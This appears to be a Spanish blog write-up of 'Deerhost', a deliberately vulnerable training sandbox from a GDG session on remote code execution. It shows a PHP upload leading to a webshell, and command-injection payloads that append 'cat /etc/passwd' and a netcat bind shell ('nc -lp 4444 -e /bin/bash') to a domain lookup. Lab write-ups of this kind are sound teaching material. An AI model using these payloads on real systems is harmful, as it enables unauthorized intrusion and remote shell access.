@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>[Write-up] Deerhost - BHF</title><meta name="Description" content="Hacking, sysadmin, beer."><meta property="og:title" content="[Write-up] Deerhost" />
+<meta property="og:description" content="Ficha técnica  Nombre: Deerhost
+  Creadores: Matías Ramirez &amp; MemoryEmpty
+  Nivel: Muy fácil
+ Introducción a Deerhost Deerhost es una sandbox que desarrollamos para que los asistentes al encuentro de GDG Training puedan poner en práctica las técnicas de RCE expuestas en el encuentro &ldquo;RCE hasta la cocina en GDG&rdquo;. Este paso a paso tiene como fín servir de material de consulta para repasar lo aprendido. Les recomiendo tener a mano las diapositivas de la exposición desarrolladas por Matías, que es un material de consulta muy claro en el impacto que estas vulnerabilidades pueden llegar a alcanzar en entornos reales." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bhf.com.ar/deerhost/" />
+<meta property="og:image" content="https://cdn.iconscout.com/icon/premium/png-256-thumb/hacker-81-1105283.png"/>
+<meta property="article:published_time" content="2020-08-02T19:48:20-03:00" />
+<meta property="article:modified_time" content="2020-08-02T19:48:20-03:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://cdn.iconscout.com/icon/premium/png-256-thumb/hacker-81-1105283.png"/>
+
+<meta name="twitter:title" content="[Write-up] Deerhost"/>
+<meta name="twitter:description" content="Ficha técnica  Nombre: Deerhost
+  Creadores: Matías Ramirez &amp; MemoryEmpty
+  Nivel: Muy fácil
+ Introducción a Deerhost Deerhost es una sandbox que desarrollamos para que los asistentes al encuentro de GDG Training puedan poner en práctica las técnicas de RCE expuestas en el encuentro &ldquo;RCE hasta la cocina en GDG&rdquo;. Este paso a paso tiene como fín servir de material de consulta para repasar lo aprendido. Les recomiendo tener a mano las diapositivas de la exposición desarrolladas por Matías, que es un material de consulta muy claro en el impacto que estas vulnerabilidades pueden llegar a alcanzar en entornos reales."/>
+<meta name="application-name" content="BHF">
+<meta name="apple-mobile-web-app-title" content="BHF"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://bhf.com.ar/deerhost/" /><link rel="prev" href="https://bhf.com.ar/deploy-hugo-pages/" /><link rel="next" href="https://bhf.com.ar/privilegios/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[Write-up] Deerhost",
+        "inLanguage": "es",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/bhf.com.ar\/deerhost\/"
+        },"image": {
+                "@type": "ImageObject",
+                "url": "https:\/\/bhf.com.ar\/cover.png",
+                "width":  800 ,
+                "height":  600 
+            },"genre": "posts","keywords": "write-up","wordcount":  745 ,
+        "url": "https:\/\/bhf.com.ar\/deerhost\/","datePublished": "2020-08-02T19:48:20-03:00","dateModified": "2020-08-02T19:48:20-03:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                "@type": "Organization",
+                "name": "xxxx",
+                "logo": {
+                "@type": "ImageObject",
+                "url": "https:\/\/bhf.com.ar\/logo.png",
+                "width":  127 ,
+                "height":  40 
+                }
+            },"author": {
+                "@type": "Person",
+                "name": "memoryempty"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="BHF"><span class="header-title-pre"><i class='fas fa-laptop fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categorias </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Buscar">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Limpiar">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="BHF"><span class="header-title-pre"><i class='fas fa-laptop fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Buscar">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Limpiar">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancelar
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categorias</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contenido</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">[Write-up] Deerhost</h1><h2 class="single-subtitle">Paso a paso para resolver esta maquina</h2><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>memoryempty</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="08-02-2020">08-02-2020</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;745 palabras&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;4 minutos&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading/normal.min.svg"
+        data-src="/images/deerhost/deerhost_main_photo.jpg"
+        data-srcset="/images/deerhost/deerhost_main_photo.jpg, /images/deerhost/deerhost_main_photo.jpg 1.5x, /images/deerhost/deerhost_main_photo.jpg 2x"
+        data-sizes="auto"
+        alt="/images/deerhost/deerhost_main_photo.jpg"
+        title="/images/deerhost/deerhost_main_photo.jpg" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contenido</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introducción-a-deerhost">Introducción a Deerhost</a></li>
+    <li><a href="#enumeración">Enumeración</a></li>
+    <li><a href="#1-tomando-el-control-con-nuestros-cvs">1. Tomando el control con nuestros CV&rsquo;s</a></li>
+    <li><a href="#2-busqueda-de-dominios-un-tanto-especial">2. Busqueda de dominios, un tanto especial</a></li>
+    <li><a href="#notas-finales">Notas finales</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="ficha-técnica">Ficha técnica</h1>
+<blockquote>
+<p><strong>Nombre</strong>: Deerhost</p>
+</blockquote>
+<blockquote>
+<p><strong>Creadores</strong>: Matías Ramirez &amp; MemoryEmpty</p>
+</blockquote>
+<blockquote>
+<p><strong>Nivel</strong>: Muy fácil</p>
+</blockquote>
+<h2 id="introducción-a-deerhost">Introducción a Deerhost</h2>
+<p>Deerhost es una sandbox que desarrollamos para que los asistentes al encuentro de GDG Training puedan poner en práctica las técnicas de RCE expuestas en el encuentro <strong>&ldquo;RCE hasta la cocina en GDG&rdquo;</strong>. Este <em>paso a paso</em> tiene como fín servir de material de  consulta para repasar lo aprendido. Les recomiendo tener a mano las diapositivas de la exposición desarrolladas por Matías, que es un material de consulta muy claro en el impacto que estas vulnerabilidades pueden llegar a alcanzar en entornos reales.</p>
+<h2 id="enumeración">Enumeración</h2>
+<p>Nuestra primera tarea a la hora de auditar -o de hackear- siempre es reconocer los posibles vectores de ataque. En este caso, con solamente navegar por el sitio podrán encontrar dos vulnerabilidades sencillas de explotación.</p>
+<h2 id="1-tomando-el-control-con-nuestros-cvs">1. Tomando el control con nuestros CV&rsquo;s</h2>
+<p>Apenas abrimos deerhost veremos un par de links en el encabezado. Si nos dirigimos a la página de <strong>&ldquo;work with us&rdquo; (/cv.php)</strong> nos encontramos con un formulario para subir nuestro CV a la empresa.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading/small.min.svg"
+        data-src="/images/deerhost/deerhost_exploit_1_a.jpg"
+        data-srcset="/images/deerhost/deerhost_exploit_1_a.jpg, /images/deerhost/deerhost_exploit_1_a.jpg 1.5x, /images/deerhost/deerhost_exploit_1_a.jpg 2x"
+        data-sizes="auto"
+        alt="foto_exploit_1"
+        title="foto_exploit_1" /></p>
+<p>Naturalmente, nos preguntamos, ¿Qué clase de cuidado han tenido los desarrolladores del sitio para prevenir que en lugar de un CV, alguien suba algún maliciosos? Para averiguarlo, podemos preparar una simple prueba:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">	&lt;?php phpinfo(); ?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>nota: phpinfo() es una función de php para consultar la version y otros datos del servicio instalado. Cuando al subir un archivo con esta función obtenemos el la ejecución del mismo, es probable que podamos ejecutar otros comando.</p>
+</blockquote>
+<p>Al subirla vemos que la respuesta del sitio delata que el archivo ha sido guardado. Si logramos dar con su paradero,  <strong>en /uploads/&lt;nombre_del_archivo.php&gt;</strong> podemos ver que nuestro prueba funciona perfectamente.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading/small.min.svg"
+        data-src="/images/deerhost/deerhost_exploit_1_b.jpg"
+        data-srcset="/images/deerhost/deerhost_exploit_1_b.jpg, /images/deerhost/deerhost_exploit_1_b.jpg 1.5x, /images/deerhost/deerhost_exploit_1_b.jpg 2x"
+        data-sizes="auto"
+        alt="foto_exploit_2"
+        title="foto_exploit_2" /></p>
+<p>Ahora podemos mejorar nuestro payload: En lugar de ejecutar dicho comando, podemos ejecutar una webshell corra en php. Pueden hacer la prueba con cualquiera de <a href="https://github.com/xl7dev/WebShell/tree/master/Php" target="_blank" rel="noopener noreffer">esta lista</a>.</p>
+<h2 id="2-busqueda-de-dominios-un-tanto-especial">2. Busqueda de dominios, un tanto especial</h2>
+<p>En la pagina principal podemos consultar por un dominio y ver si esta disponible para contratarlo. No hay nada raro en ello, sin embargo, al hacer una simple consulta - como puede ser ingresando <strong>google.com</strong> - el output del sitio nos resulta algo peculiar.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading/small.min.svg"
+        data-src="/images/deerhost/deerhost_exploit_2_a.jpg"
+        data-srcset="/images/deerhost/deerhost_exploit_2_a.jpg, /images/deerhost/deerhost_exploit_2_a.jpg 1.5x, /images/deerhost/deerhost_exploit_2_a.jpg 2x"
+        data-sizes="auto"
+        alt="foto_exploit_2"
+        title="foto_exploit_2" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading/small.min.svg"
+        data-src="/images/deerhost/deerhost_exploit_2_b.jpg"
+        data-srcset="/images/deerhost/deerhost_exploit_2_b.jpg, /images/deerhost/deerhost_exploit_2_b.jpg 1.5x, /images/deerhost/deerhost_exploit_2_b.jpg 2x"
+        data-sizes="auto"
+        alt="foto_exploit_2"
+        title="foto_exploit_2" /></p>
+<blockquote>
+<p>¿Qué es nslookup? Es un comando de linux para obtener informacion de un dominio (concretamente, del DNS). su uso es sencillo, basta con poner &lsquo;nslookup google.com&rsquo; para obtener los datos.</p>
+</blockquote>
+<p>Hay buenas razonas para pensar que este buscador esta ejecutando nslookup con los parámetros que le hemos indicado. ¿Será acaso posible correr más de un comando? ¡Vamos a averiguarlo!, para ello, imaginamos que, como en cualquier linea de terminal en linux, es posible ejecutar más de un solo comando. Para confirmar nuestra teoría podremos escribir un payload parecido al siguiente: (<em>¿Quizás a esta altura deberíamos ofrecernos como diseñadores creativos de naming?</em>)</p>
+<p><code>asdqweasdqe.com; cat /etc/passwd</code></p>
+<p>Lo que estamos haciendo se parece a decirle al sitio <em>&ldquo;hey! quiero revisar este dominio (cualquiera), y luego ejecuta el comando <code>cat</code> al archivo de <code>/etc/passwd</code>&rdquo;</em>. Como vemos, nuestra prueba funciona y ya sabemos también algunas cosas más del servidor.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading/small.min.svg"
+        data-src="/images/deerhost/deerhost_exploit_2_c.jpg"
+        data-srcset="/images/deerhost/deerhost_exploit_2_c.jpg, /images/deerhost/deerhost_exploit_2_c.jpg 1.5x, /images/deerhost/deerhost_exploit_2_c.jpg 2x"
+        data-sizes="auto"
+        alt="foto_exploit_2"
+        title="foto_exploit_2" /></p>
+<p>Una vez que hayamos descubierta una vulnerabilidad como esta, ya podemos correr todo tipo de comandos. Por ejemplo, como en el caso del payload anterior, podemos intentar conseguir una shell. En este caso lo que haremos será correr netcat del lado del servidor, esperando una conexión remota:</p>
+<p><code>bhf.com.ar; nc -lp 4444 -e /bin/bash</code></p>
+<p>los flags de netcat usados aquí son:</p>
+<pre><code>--listen 	para dejar en modo escucha el puerto.
+--port 4444	indica el puerto por el cual nos conectaremos.
+--execute	indica al servidor que corra un programa, en este caso
+            /bin/bash, una vez que se establezca la conexión.
+</code></pre>
+<p>Cuando hacemos nuestra consulta, vemos que el la pagina queda indefinidamente en pausa, ese es un signo bastante bueno cuando ejecutamos payloads que dejan servicios corriendo del lado del servidor.</p>
+<p>¡Ahora debemos conectarnos! para ello, usamos netcat nuevamente, desde nuestra propia terminal:</p>
+<p><code>nc gdg-ctf.hostear.com.ar -v 4444</code></p>
+<p>Podemos usar la ip o el dominio. Por otro lado hemos activado el flag <code>--verbose</code> para obtener más información. Con ello, ya tendremos acceso al servidor.</p>
+<h2 id="notas-finales">Notas finales</h2>
+<p>Aunque deerhost presente a simple vista un escenario muy sencillo y puede vulnerarse con facilidad, su riqueza esta en ser más realista de lo que uno se imagina. Para quienes recién comienzan a tomar conciencia de la importancia de la ciberseguridad puede ser muy útil hacer las pruebas localmente, y por supuesto ver que más pueden encontrar. El repositorio de github se encuentra abierto a todos aquellos que quieran probarlo <a href="https://github.com/duality084/gdg-rce-ctf" target="_blank" rel="noopener noreffer">gdg-rce-ctf</a></p>
+<p><strong>Happy Hacking!</strong></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Actualizado el 08-02-2020</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Compartir en Blogger" data-sharer="blogger" data-url="https://bhf.com.ar/deerhost/" data-title="[Write-up] Deerhost" data-description=""><i class="fab fa-blogger fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/write-up/">write-up</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Regresar</a></span>&nbsp;|&nbsp;<span><a href="/">Inicio</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/deploy-hugo-pages/" class="prev" rel="prev" title="Automatizando el deploying del blog con Hugo y Travis."><i class="fas fa-angle-left fa-fw"></i>Automatizando el deploying del blog con Hugo y Travis.</a>
+            <a href="/privilegios/" class="next" rel="next" title="Checklist para escalar privilegios desde www-data">Checklist para escalar privilegios desde www-data<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Provisto por <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.74.3">Hugo</a> | Tema - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.9"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Volver arriba">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="Ver comentarios">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.es.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.0/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copiar al portapapeles","maxShownLines":10},"comment":{},"data":{"id-1":"# /home/BHF","id-2":"# /home/BHF"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"es","maxResultLength":10,"noResultsFound":"No se encontraron resultados","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
